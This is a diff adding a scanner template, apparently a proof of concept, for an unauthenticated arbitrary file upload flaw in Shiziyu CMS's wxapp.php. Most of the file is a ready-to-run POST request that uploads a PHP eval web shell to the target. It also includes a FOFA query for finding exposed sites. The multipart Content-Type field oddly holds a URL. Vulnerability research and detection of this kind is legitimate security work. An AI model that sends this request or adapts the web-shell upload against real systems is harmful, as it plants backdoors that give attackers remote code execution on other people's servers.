@@ -1,0 +1,31 @@
+id: shiziyu-cms-wxapp.php-Anyfileupload
+
+info:
+  name: 狮子鱼CMS wxapp.php 任意文件上传漏洞
+  author: daffainfo
+  severity: critical
+  description: |
+    狮子鱼CMS wxapp.php文件 存在任意文件上传漏洞，攻击者在没有身份验证的情况下可以上传恶意文件
+    fofa-query: "/seller.php?s=/Public/login"
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/%E7%8B%AE%E5%AD%90%E9%B1%BCCMS%20wxapp.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+
+set:
+  r1: randomLowercase(20)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /wxapp.php?controller=Goods.doPageUpload
+      headers:
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundary{{rboundary}}
+      body: |
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="upfile";  filename="{{r1}}.php"
+        Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif
+        
+        <?php @eval($_POST[test]);?>
+        ------WebKitFormBoundary{{rboundary}}—
+    expression: response.status == 200 && response.body.bcontains(bytes(r1))
+expression: r0()
